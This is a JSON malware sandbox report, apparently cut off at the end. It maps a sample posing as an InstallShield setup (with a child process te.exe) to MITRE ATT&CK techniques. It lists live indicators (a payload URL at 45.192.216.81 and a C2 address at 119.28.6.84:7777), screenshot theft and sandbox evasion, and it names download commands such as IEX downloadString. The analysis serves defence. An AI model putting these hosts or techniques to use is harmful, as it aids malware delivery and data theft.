{"data": {"CAPA": {"tactics": [{"id": "TA0005", "name": "Defense Evasion", "link": "https://attack.mitre.org/tactics/TA0005/", "description": "The adversary is trying to avoid being detected.\n\nDefense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics\u2019 techniques are cross-listed here when those techniques include the added benefit of subverting defenses. ", "techniques": [{"id": "T1027", "name": "Obfuscated Files or Information", "link": "https://attack.mitre.org/techniques/T1027/", "description": "Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. \nPayloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and Deobfuscate/Decode Files or Information for User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.  Adversaries may also use compressed or archived scripts, such as JavaScript. \nPortions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery.  Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. \nAdversaries may also abuse Command Obfuscation to obscure commands executed from payloads or directly via Command and Scripting Interpreter. Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms.   ", "signatures": [{"severity": "INFO", "description": "encode data using XOR"}, {"severity": "INFO", "description": "encode data using Base64"}]}, {"id": "T1027.005", "name": "Indicator Removal from Tools", "link": "https://attack.mitre.org/techniques/T1027/005/", "description": "Adversaries may remove indicators from tools if they believe their malicious tool was detected, quarantined, or otherwise curtailed. They can modify the tool by removing the indicator and using the updated version that is no longer detected by the target's defensive systems or subsequent targets that may use similar systems.\nA good example of this is when malware is detected with a file signature and quarantined by anti-virus software. An adversary who can determine that the malware was quarantined because of its file signature may modify the file to explicitly avoid that signature, and then re-use the malware.", "signatures": [{"severity": "INFO", "description": "contain obfuscated stackstrings"}]}]}]}, "CAPE Sandbox": {"tactics": [{"id": "TA0011", "name": "Command and Control", "link": "https://attack.mitre.org/tactics/TA0011/", "description": "The adversary is trying to communicate with compromised systems to control them.\n\nCommand and Control consists of techniques that adversaries may use to communicate with systems under their control within a victim network. Adversaries commonly attempt to mimic normal, expected traffic to avoid detection. There are many ways an adversary can establish command and control with various levels of stealth depending on the victim\u2019s network structure and defenses.", "techniques": [{"id": "T1071", "name": "Application Layer Protocol", "link": "https://attack.mitre.org/techniques/T1071/", "description": "Adversaries may communicate using OSI application layer protocols to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \nAdversaries may utilize many different protocols, including those used for web browsing, transferring files, electronic mail, DNS, or publishing/subscribing. For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), commonly used protocols are SMB, SSH, or RDP. ", "signatures": [{"severity": "UNKNOWN", "description": "Adversaries may communicate using application layer protocols to avoid detection/network filtering by blending in with existing traffic."}]}]}, {"id": "TA0005", "name": "Defense Evasion", "link": "https://attack.mitre.org/tactics/TA0005/", "description": "The adversary is trying to avoid being detected.\n\nDefense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics\u2019 techniques are cross-listed here when those techniques include the added benefit of subverting defenses. ", "techniques": [{"id": "T1027", "name": "Obfuscated Files or Information", "link": "https://attack.mitre.org/techniques/T1027/", "description": "Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. \nPayloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and Deobfuscate/Decode Files or Information for User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.  Adversaries may also use compressed or archived scripts, such as JavaScript. \nPortions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery.  Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. \nAdversaries may also abuse Command Obfuscation to obscure commands executed from payloads or directly via Command and Scripting Interpreter. Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms.   ", "signatures": [{"severity": "UNKNOWN", "description": "Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit."}]}, {"id": "T1027.002", "name": "Software Packing", "link": "https://attack.mitre.org/techniques/T1027/002/", "description": "Adversaries may perform software packing or virtual machine software protection to conceal their code. Software packing is a method of compressing or encrypting an executable. Packing an executable changes the file signature in an attempt to avoid signature-based detection. Most decompression techniques decompress the executable code in memory. Virtual machine software protection translates an executable's original code into a special format that only a special virtual machine can run. A virtual machine is then called to run this code. \nUtilities used to perform software packing are called packers. Example packers are MPRESS and UPX. A more comprehensive list of known packers is available, but adversaries may create their own packing techniques that do not leave the same artifacts as well-known packers to evade defenses.  ", "signatures": [{"severity": "UNKNOWN", "description": "Adversaries may perform software packing or virtual machine software protection to conceal their code."}]}]}]}, "SecondWrite": {"tactics": [{"id": "TA0011", "name": "Command and Control", "link": "https://attack.mitre.org/tactics/TA0011/", "description": "The adversary is trying to communicate with compromised systems to control them.\n\nCommand and Control consists of techniques that adversaries may use to communicate with systems under their control within a victim network. Adversaries commonly attempt to mimic normal, expected traffic to avoid detection. There are many ways an adversary can establish command and control with various levels of stealth depending on the victim\u2019s network structure and defenses.", "techniques": [{"id": "T1105", "name": "Ingress Tool Transfer", "link": "https://attack.mitre.org/techniques/T1105/", "description": "Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as ftp. Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. Lateral Tool Transfer). \nOn Windows, adversaries may use various utilities to download tools, such as copy, finger, certutil, and PowerShell commands such as IEX(New-Object Net.WebClient).downloadString() and Invoke-WebRequest. On Linux and macOS systems, a variety of utilities also exist, such as curl, scp, sftp, tftp, rsync, finger, and wget.  A number of these tools, such as wget, curl, and scp, also exist on ESXi. After downloading a file, a threat actor may attempt to verify its integrity by checking its hash value (e.g., via certutil -hashfile).\nAdversaries may also abuse installers and package managers, such as yum or winget, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows search-ms protocol handler, to deliver malicious files to victims through remote file searches invoked by User Execution (typically after interacting with Phishing lures).\nFiles can also be transferred using various Web Services as well as native or otherwise present tools on the victim system. In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine.", "signatures": [{"severity": "UNKNOWN", "description": "Remote File Copy"}]}, {"id": "T1065", "name": "Uncommonly Used Port", "link": "https://attack.mitre.org/techniques/T1065/", "description": "Adversaries may conduct C2 communications over a non-standard port to bypass proxies and firewalls that have been improperly configured.", "signatures": [{"severity": "UNKNOWN", "description": "Uncommonly Used Port"}]}, {"id": "T1043", "name": "Commonly Used Port", "link": "https://attack.mitre.org/techniques/T1043/", "description": "This technique has been deprecated. Please use Non-Standard Port where appropriate.\nAdversaries may communicate over a commonly used port to bypass firewalls or network detection systems and to blend with normal network activity to avoid more detailed inspection. They may use commonly open ports such as\n\nTCP:80 (HTTP)\nTCP:443 (HTTPS)\nTCP:25 (SMTP)\nTCP/UDP:53 (DNS)\n\nThey may use the protocol associated with the port or a completely different protocol. \nFor connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), examples of common ports are \n\nTCP/UDP:135 (RPC)\nTCP/UDP:22 (SSH)\nTCP/UDP:3389 (RDP)\n", "signatures": [{"severity": "UNKNOWN", "description": "Commonly Used Port"}]}, {"id": "T1094", "name": "Custom Command and Control Protocol", "link": "https://attack.mitre.org/techniques/T1094/", "description": "Adversaries may communicate using a custom command and control protocol instead of encapsulating commands/data in an existing Application Layer Protocol. Implementations include mimicking well-known protocols or developing custom protocols (including raw sockets) on top of fundamental protocols provided by TCP/IP/another standard network stack.", "signatures": [{"severity": "UNKNOWN", "description": "Custom Command and Control Protocol"}]}]}, {"id": "TA0007", "name": "Discovery", "link": "https://attack.mitre.org/tactics/TA0007/", "description": "The adversary is trying to figure out your environment.\n\nDiscovery consists of techniques an adversary may use to gain knowledge about the system and internal network. These techniques help adversaries observe the environment and orient themselves before deciding how to act. They also allow adversaries to explore what they can control and what\u2019s around their entry point in order to discover how it could benefit their current objective. Native operating system tools are often used toward this post-compromise information-gathering objective. ", "techniques": [{"id": "T1082", "name": "System Information Discovery", "link": "https://attack.mitre.org/techniques/T1082/", "description": "An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nTools such as Systeminfo can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the systemsetup configuration tool on macOS. As an example, adversaries with user-level access can execute the df -aH command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a Network Device CLI on network devices to gather detailed system information (e.g. show version). On ESXi servers, threat actors may gather system information from various esxcli utilities, such as system hostname get, system version get, and storage filesystem list (to list storage volumes).\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.\nSystem Information Discovery combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment. ", "signatures": [{"severity": "UNKNOWN", "description": "System Information Discovery"}]}, {"id": "T1497", "name": "Virtualization/Sandbox Evasion", "link": "https://attack.mitre.org/techniques/T1497/", "description": "Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors.\nAdversaries may use several methods to accomplish Virtualization/Sandbox Evasion such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox.", "signatures": [{"severity": "UNKNOWN", "description": "Virtualization / Sandbox Evasion"}]}, {"id": "T1057", "name": "Process Discovery", "link": "https://attack.mitre.org/techniques/T1057/", "description": "Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Administrator or otherwise elevated access may provide better process details. Adversaries may use the information from Process Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nIn Windows environments, adversaries could obtain details on running processes using the Tasklist utility via cmd or Get-Process via PowerShell. Information about processes can also be extracted from the output of Native API calls such as CreateToolhelp32Snapshot. In Mac and Linux, this is accomplished with the ps command. Adversaries may also opt to enumerate processes via /proc. ESXi also supports use of the ps command, as well as esxcli system process list.\nOn network devices, Network Device CLI commands such as show processes can be used to display current running processes.", "signatures": [{"severity": "UNKNOWN", "description": "Process Discovery"}]}]}, {"id": "TA0005", "name": "Defense Evasion", "link": "https://attack.mitre.org/tactics/TA0005/", "description": "The adversary is trying to avoid being detected.\n\nDefense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics\u2019 techniques are cross-listed here when those techniques include the added benefit of subverting defenses. ", "techniques": [{"id": "T1497", "name": "Virtualization/Sandbox Evasion", "link": "https://attack.mitre.org/techniques/T1497/", "description": "Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors.\nAdversaries may use several methods to accomplish Virtualization/Sandbox Evasion such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox.", "signatures": [{"severity": "UNKNOWN", "description": "Virtualization / Sandbox Evasion"}]}, {"id": "T1045", "name": "Software Packing", "link": "https://attack.mitre.org/techniques/T1045/", "description": "Software packing is a method of compressing or encrypting an executable. Packing an executable changes the file signature in an attempt to avoid signature-based detection. Most decompression techniques decompress the executable code in memory.\nUtilities used to perform software packing are called packers. Example packers are MPRESS and UPX. A more comprehensive list of known packers is available,  but adversaries may create their own packing techniques that do not leave the same artifacts as well-known packers to evade defenses.\nAdversaries may use virtual machine software protection as a form of software packing to protect their code. Virtual machine software protection translates an executable's original code into a special format that only a special virtual machine can run. A virtual machine is then called to run this code.", "signatures": [{"severity": "UNKNOWN", "description": "Software Packing"}]}, {"id": "T1143", "name": "Hidden Window", "link": "https://attack.mitre.org/techniques/T1143/", "description": "Adversaries may implement hidden windows to conceal malicious activity from the plain sight of users. In some cases, windows that would typically be displayed when an application carries out an operation can be hidden. This may be utilized by system administrators to avoid disrupting user work environments when carrying out administrative tasks. Adversaries may abuse operating system functionality to hide otherwise visible windows from users so as not to alert the user to adversary activity on the system.\nWindows\nThere are a variety of features in scripting languages in Windows, such as PowerShell, Jscript, and VBScript to make windows hidden. One example of this is powershell.exe -WindowStyle Hidden.  \nMac\nThe configurations for how applications run on macOS are listed in property list (plist) files. One of the tags in these files can be\u00a0apple.awt.UIElement, which allows for Java applications to prevent the application's icon from appearing in the Dock. A common use for this is when applications run in the system tray, but don't also want to show up in the Dock. However, adversaries can abuse this feature and hide their running window.", "signatures": [{"severity": "UNKNOWN", "description": "Hidden Window"}]}, {"id": "T1096", "name": "NTFS File Attributes", "link": "https://attack.mitre.org/techniques/T1096/", "description": "Every New Technology File System (NTFS) formatted partition contains a Master File Table (MFT) that maintains a record for every file/directory on the partition.  Within MFT entries are file attributes,  such as Extended Attributes (EA) and Data [known as Alternate Data Streams (ADSs) when more than one Data attribute is present], that can be used to store arbitrary data (and even complete files).    \nAdversaries may store malicious data or binaries in file attribute metadata instead of directly in files. This may be done to evade some defenses, such as static indicator scanning tools and anti-virus.  ", "signatures": [{"severity": "UNKNOWN", "description": "NTFS File Attributes"}]}, {"id": "T1107", "name": "File Deletion", "link": "https://attack.mitre.org/techniques/T1107/", "description": "Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.\nThere are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well. Examples include native cmd functions such as DEL, secure deletion tools such as Windows Sysinternals SDelete, or other third-party file deletion tools. ", "signatures": [{"severity": "UNKNOWN", "description": "File Deletion"}]}]}, {"id": "TA0006", "name": "Credential Access", "link": "https://attack.mitre.org/tactics/TA0006/", "description": "The adversary is trying to steal account names and passwords.\n\nCredential Access consists of techniques for stealing credentials like account names and passwords. Techniques used to get credentials include keylogging or credential dumping. Using legitimate credentials can give adversaries access to systems, make them harder to detect, and provide the opportunity to create more accounts to help achieve their goals.", "techniques": [{"id": "T1003", "name": "OS Credential Dumping", "link": "https://attack.mitre.org/techniques/T1003/", "description": "Adversaries may attempt to dump credentials to obtain account login and credential material, normally in the form of a hash or a clear text password. Credentials can be obtained from OS caches, memory, or structures. Credentials can then be used to perform Lateral Movement and access restricted information.\nSeveral of the tools mentioned in associated sub-techniques may be used by both adversaries and professional security testers. Additional custom tools likely exist as well.", "signatures": [{"severity": "UNKNOWN", "description": "Credential Dumping"}]}]}]}, "VMRay": {"tactics": [{"id": "TA0005", "name": "Defense Evasion", "link": "https://attack.mitre.org/tactics/TA0005/", "description": "The adversary is trying to avoid being detected.\n\nDefense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics\u2019 techniques are cross-listed here when those techniques include the added benefit of subverting defenses. ", "techniques": [{"id": "T1045", "name": "Software Packing", "link": "https://attack.mitre.org/techniques/T1045/", "description": "Software packing is a method of compressing or encrypting an executable. Packing an executable changes the file signature in an attempt to avoid signature-based detection. Most decompression techniques decompress the executable code in memory.\nUtilities used to perform software packing are called packers. Example packers are MPRESS and UPX. A more comprehensive list of known packers is available,  but adversaries may create their own packing techniques that do not leave the same artifacts as well-known packers to evade defenses.\nAdversaries may use virtual machine software protection as a form of software packing to protect their code. Virtual machine software protection translates an executable's original code into a special format that only a special virtual machine can run. A virtual machine is then called to run this code.", "signatures": [{"severity": "INFO", "description": "(Process #1) installshield setup.exe overwrites code to possibly hide behavior."}]}, {"id": "T1112", "name": "Modify Registry", "link": "https://attack.mitre.org/techniques/T1112/", "description": "Adversaries may interact with the Windows Registry as part of a variety of other techniques to aid in defense evasion, persistence, and execution.\nAccess to specific areas of the Registry depends on account permissions, with some keys requiring administrator-level access. The built-in Windows command-line utility Reg may be used for local or remote Registry modification. Other tools, such as remote access tools, may also contain functionality to interact with the Registry through the Windows API.\nThe Registry may be modified in order to hide configuration information or malicious payloads via Obfuscated Files or Information. The Registry may also be modified to Impair Defenses, such as by enabling macros for all Microsoft Office products, allowing privilege escalation without alerting the user, increasing the maximum number of allowed outbound requests, and/or modifying systems to store plaintext credentials in memory.\nThe Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system. Often Valid Accounts are required, along with access to the remote system's SMB/Windows Admin Shares for RPC communication.\nFinally, Registry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via Reg or other utilities using the Win32 API. Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence.", "signatures": [{"severity": "INFO", "description": "(Process #5) te.exe hides 393824 bytes in \"HKEY_CURRENT_USER\\Console\\0\\32af87c1e3d8531abcb9fc927688e14e\"."}]}, {"id": "T1497", "name": "Virtualization/Sandbox Evasion", "link": "https://attack.mitre.org/techniques/T1497/", "description": "Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors.\nAdversaries may use several methods to accomplish Virtualization/Sandbox Evasion such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox.", "signatures": [{"severity": "LOW", "description": "(Process #1) installshield setup.exe is possibly trying to detect a VM via rdtsc."}]}]}, {"id": "TA0006", "name": "Credential Access", "link": "https://attack.mitre.org/tactics/TA0006/", "description": "The adversary is trying to steal account names and passwords.\n\nCredential Access consists of techniques for stealing credentials like account names and passwords. Techniques used to get credentials include keylogging or credential dumping. Using legitimate credentials can give adversaries access to systems, make them harder to detect, and provide the opportunity to create more accounts to help achieve their goals.", "techniques": [{"id": "T1056", "name": "Input Capture", "link": "https://attack.mitre.org/techniques/T1056/", "description": "Adversaries may use methods of capturing user input to obtain credentials or collect information. During normal system usage, users often provide credentials to various different locations, such as login pages/portals or system dialog boxes. Input capture mechanisms may be transparent to the user (e.g. Credential API Hooking) or rely on deceiving the user into providing input into what they believe to be a genuine service (e.g. Web Portal Capture).", "signatures": [{"severity": "HIGH", "description": "(Process #5) te.exe takes screenshots and potentially exfiltrates data."}]}]}, {"id": "TA0009", "name": "Collection", "link": "https://attack.mitre.org/tactics/TA0009/", "description": "The adversary is trying to gather data of interest to their goal.\n\nCollection consists of techniques adversaries may use to gather information and the sources information is collected from that are relevant to following through on the adversary's objectives. Frequently, the next goal after collecting data is to either steal (exfiltrate) the data or to use the data to gain more information about the target environment. Common target sources include various drive types, browsers, audio, video, and email. Common collection methods include capturing screenshots and keyboard input.", "techniques": [{"id": "T1056", "name": "Input Capture", "link": "https://attack.mitre.org/techniques/T1056/", "description": "Adversaries may use methods of capturing user input to obtain credentials or collect information. During normal system usage, users often provide credentials to various different locations, such as login pages/portals or system dialog boxes. Input capture mechanisms may be transparent to the user (e.g. Credential API Hooking) or rely on deceiving the user into providing input into what they believe to be a genuine service (e.g. Web Portal Capture).", "signatures": [{"severity": "HIGH", "description": "(Process #5) te.exe takes screenshots and potentially exfiltrates data."}]}, {"id": "T1113", "name": "Screen Capture", "link": "https://attack.mitre.org/techniques/T1113/", "description": "Adversaries may attempt to take screen captures of the desktop to gather information over the course of an operation. Screen capturing functionality may be included as a feature of a remote access tool used in post-compromise operations. Taking a screenshot is also typically possible through native utilities or API calls, such as CopyFromScreen, xwd, or screencapture.", "signatures": [{"severity": "MEDIUM", "description": "(Process #5) te.exe takes a screenshot using BitBlt API."}]}, {"id": "T1119", "name": "Automated Collection", "link": "https://attack.mitre.org/techniques/T1119/", "description": "Once established within a system or network, an adversary may use automated techniques for collecting internal data. Methods for performing this technique could include use of a Command and Scripting Interpreter to search for and copy information fitting set criteria such as file type, location, or name at specific time intervals. \nIn cloud-based environments, adversaries may also use cloud APIs, data pipelines, command line interfaces, or extract, transform, and load (ETL) services to automatically collect data. \nThis functionality could also be built into remote access tools. \nThis technique may incorporate use of other techniques such as File and Directory Discovery and Lateral Tool Transfer to identify and move files, as well as Cloud Service Dashboard and Cloud Storage Object Discovery to identify resources in cloud environments.", "signatures": [{"severity": "HIGH", "description": "(Process #5) te.exe takes screenshots and potentially exfiltrates data."}]}]}, {"id": "TA0007", "name": "Discovery", "link": "https://attack.mitre.org/tactics/TA0007/", "description": "The adversary is trying to figure out your environment.\n\nDiscovery consists of techniques an adversary may use to gain knowledge about the system and internal network. These techniques help adversaries observe the environment and orient themselves before deciding how to act. They also allow adversaries to explore what they can control and what\u2019s around their entry point in order to discover how it could benefit their current objective. Native operating system tools are often used toward this post-compromise information-gathering objective. ", "techniques": [{"id": "T1057", "name": "Process Discovery", "link": "https://attack.mitre.org/techniques/T1057/", "description": "Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Administrator or otherwise elevated access may provide better process details. Adversaries may use the information from Process Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nIn Windows environments, adversaries could obtain details on running processes using the Tasklist utility via cmd or Get-Process via PowerShell. Information about processes can also be extracted from the output of Native API calls such as CreateToolhelp32Snapshot. In Mac and Linux, this is accomplished with the ps command. Adversaries may also opt to enumerate processes via /proc. ESXi also supports use of the ps command, as well as esxcli system process list.\nOn network devices, Network Device CLI commands such as show processes can be used to display current running processes.", "signatures": [{"severity": "INFO", "description": "(Process #5) te.exe enumerates running processes."}]}, {"id": "T1124", "name": "System Time Discovery", "link": "https://attack.mitre.org/techniques/T1124/", "description": "An adversary may gather the system time and/or time zone settings from a local or remote system. The system time is set and stored by services, such as the Windows Time Service on Windows or systemsetup on macOS. These time settings may also be synchronized between systems and services in an enterprise network, typically accomplished with a network time server within a domain.\nSystem time information may be gathered in a number of ways, such as with Net on Windows by performing net time \\hostname to gather the system time on a remote system. The victim's time zone may also be inferred from the current system time or gathered by using w32tm /tz. In addition, adversaries can discover device uptime through functions such as GetTickCount() to determine how long it has been since the system booted up.\nOn network devices, Network Device CLI commands such as show clock detail can be used to see the current time configuration. On ESXi servers, esxcli system clock get can be used for the same purpose.\nIn addition, system calls \u2013 such as time() \u2013 have been used to collect the current time on Linux devices. On macOS systems, adversaries may use commands such as systemsetup -gettimezone or timeIntervalSinceNow to gather current time zone information or current date and time.\nThis information could be useful for performing other techniques, such as executing a file with a Scheduled Task/Job, or to discover locality information based on time zone to assist in victim targeting (i.e. System Location Discovery). Adversaries may also use knowledge of system time as part of a time bomb, or delaying execution until a specified date/time.", "signatures": [{"severity": "LOW", "description": "(Process #1) installshield setup.exe is possibly trying to detect a VM via rdtsc."}]}, {"id": "T1497", "name": "Virtualization/Sandbox Evasion", "link": "https://attack.mitre.org/techniques/T1497/", "description": "Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors.\nAdversaries may use several methods to accomplish Virtualization/Sandbox Evasion such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox.", "signatures": [{"severity": "LOW", "description": "(Process #1) installshield setup.exe is possibly trying to detect a VM via rdtsc."}]}]}, {"id": "TA0011", "name": "Command and Control", "link": "https://attack.mitre.org/tactics/TA0011/", "description": "The adversary is trying to communicate with compromised systems to control them.\n\nCommand and Control consists of techniques that adversaries may use to communicate with systems under their control within a victim network. Adversaries commonly attempt to mimic normal, expected traffic to avoid detection. There are many ways an adversary can establish command and control with various levels of stealth depending on the victim\u2019s network structure and defenses.", "techniques": [{"id": "T1065", "name": "Uncommonly Used Port", "link": "https://attack.mitre.org/techniques/T1065/", "description": "Adversaries may conduct C2 communications over a non-standard port to bypass proxies and firewalls that have been improperly configured.", "signatures": [{"severity": "INFO", "description": "(Process #5) te.exe tries to connect to TCP port 7777 at 119.28.6.84."}]}, {"id": "T1071", "name": "Application Layer Protocol", "link": "https://attack.mitre.org/techniques/T1071/", "description": "Adversaries may communicate using OSI application layer protocols to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \nAdversaries may utilize many different protocols, including those used for web browsing, transferring files, electronic mail, DNS, or publishing/subscribing. For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), commonly used protocols are SMB, SSH, or RDP. ", "signatures": [{"severity": "INFO", "description": "(Process #1) installshield setup.exe downloads file via http from http://45.192.216.81/06/login.bin."}]}, {"id": "T1105", "name": "Ingress Tool Transfer", "link": "https://attack.mitre.org/techniques/T1105/", "description": "Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as ftp. Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. Lateral Tool Transfer). \nOn Windows, adversaries may use various utilities to download tools, such as copy, finger, certutil, and PowerShell commands such as IEX(New-Object Net.WebClient).downloadString() and Invoke-WebRequest. On Linux and macOS systems, a variety of utilities also exist, such as curl, scp, sftp, tftp, rsync, finger, and wget.  A number of these tools, such as wget, curl, and scp, also exist on ESXi. After downloading a file, a threat actor may attempt to verify its integrity by checking its hash value (e.g., via certutil -hashfile).\nAdversaries may also abuse installers and package managers, such as yum or winget, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows search-ms protocol handler, to deliver malicious files to victims through remote file searches invoked by User Execution (typically after interacting with Phishing lures).\nFiles can also be transferred using various Web Services as well as native or otherwise present tools on the victim system. In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine.", "signatures": [{"severity": "INFO", "description": "(Process #1) installshield setup.exe downloads file via http from http://45.192.216.81/06/login.bin."}]}]}, {"id": "TA0002", "name": "Execution", "link": "https://attack.mitre.org/tactics/TA0002/", "description": "The adversary is trying to run malicious code.\n\nExecution consists of techniques that result in adversary-controlled code running on a local or remote system. Techniques that run malicious code are often paired with techniques from all other tactics to achieve broader goals, like exploring a network or stealing data. For example, an adversary might use a remote access tool to run a PowerShell script that does Remote System Discovery. ", "techniques": [{"id": "T1106", "name": "Native API", "link": "https://attack.mitre.org/techniques/T1106/", "description": "Adversaries may interact with the native OS application programming interface (API) to execute behaviors. Native APIs provide a controlled means of calling low-level OS services within the kernel, such as those involving hardware/devices, memory, and processes. These native APIs are leveraged by the OS during system boot (when other system components are not yet initialized) as well as carrying out tasks and requests during routine operations.\nAdversaries may abuse these OS API functions as a means of executing behaviors. Similar to Command and Scripting Interpreter, the native API and its hierarchy of interfaces provide mechanisms to interact with and utilize various components of a victimized system.\nNative API functions (such as NtCreateProcess) may be directed invoked via system calls / syscalls, but these features are also often exposed to user-mode applications via interfaces and libraries. For example, functions such as the Windows API CreateProcess() or GNU fork() will allow programs and scripts to start other processes. This may allow API callers to execute a binary, run a CLI command, load modules, etc. as thousands of similar API functions exist for various system operations.\nHigher level software frameworks, such as Microsoft .NET and macOS Cocoa, are also available to interact with native APIs. These frameworks typically provide language wrappers/abstractions to API functionalities and are designed for ease-of-use/portability of code.\nAdversaries may use assembly to directly or in-directly invoke syscalls in an attempt to subvert defensive sensors and detection signatures such as user mode API-hooks. Adversaries may also attempt to tamper with sensors and defensive tools associated with API monitoring, such as unhooking monitored functions 